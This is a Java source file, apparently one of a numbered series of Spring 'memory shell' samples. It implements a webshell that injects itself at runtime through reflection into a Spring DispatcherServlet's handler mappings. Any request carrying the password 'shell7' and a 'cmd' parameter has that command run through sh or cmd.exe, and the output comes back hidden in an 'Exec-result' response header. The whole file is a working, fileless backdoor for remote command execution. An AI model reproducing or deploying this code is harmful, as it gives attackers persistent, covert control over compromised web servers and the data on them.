package com.example.springshell.memshell;

import com.example.springshell.utils.Util;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.web.servlet.*;

import java.io.IOException;
import java.io.InputStream;
import java.util.List;
import java.util.Scanner;

public class No7_HandlerMappingShell implements HandlerMapping {
    HandlerExecutionChain chain;
    public No7_HandlerMappingShell(){
        chain = new HandlerExecutionChain(new com.example.springshell.memshell.No7_HandlerMappingShell.MyHandler());
    }

    public static String injectShell() throws Exception{
        DispatcherServlet servlet = new Util().getServlet();
        List<HandlerAdapter> handlerAdapters = (List<HandlerAdapter>) Util.getFieldValue(servlet,"handlerAdapters");
        handlerAdapters.add(new com.example.springshell.memshell.No7_HandlerMappingShell.MyHandlerAdapter());
        List<HandlerMapping> handlerMappings = (List<HandlerMapping>) Util.getFieldValue(servlet,"handlerMappings");
        handlerMappings.add(0,new com.example.springshell.memshell.No7_HandlerMappingShell());
        return "{\"result\":\"No7_HandlerMappingShell\"}";
    }

    @Override
    public boolean usesPathPatterns() {
        return HandlerMapping.super.usesPathPatterns();
    }

    // 任何路径，或者写的任意构造
    @Override
    public HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
        String passwd = request.getParameter("pass");
        String cmd = request.getParameter("cmd");
        if(passwd!=null && cmd!=null && passwd.equals("shell7") && !cmd.isEmpty()){
            return chain;
        }
        return null;
    }

    static class MyHandlerAdapter implements HandlerAdapter {
        @Override
        public boolean supports(Object handler) {
            return handler instanceof com.example.springshell.memshell.No7_HandlerMappingShell.MyHandler;
        }

        @Override
        public ModelAndView handle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            ((com.example.springshell.memshell.No7_HandlerMappingShell.MyHandler)handler).handle(request,response);
            return null;
        }

        @Override
        public long getLastModified(HttpServletRequest request, Object handler) {
            return 0;
        }
    }

    class MyHandler{
        public void handle(HttpServletRequest request,HttpServletResponse response) throws IOException, IOException {
            if (request.getParameter("cmd") !=null) {
                boolean islinux = true;
                String osType = System.getProperty("os.name");
                if (osType !=null && osType.toLowerCase().contains("win")){
                    islinux = false;
                }
                String[] cmds = islinux ? new String[]{"sh","-c",request.getParameter("cmd")} : new String[]{"cmd.exe","/c",request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
//                response.getWriter().write(output);
//                response.getWriter().flush();
//                response.getWriter().close();
                response.setHeader("Exec-result", new String(output));
            }
        }
    }

}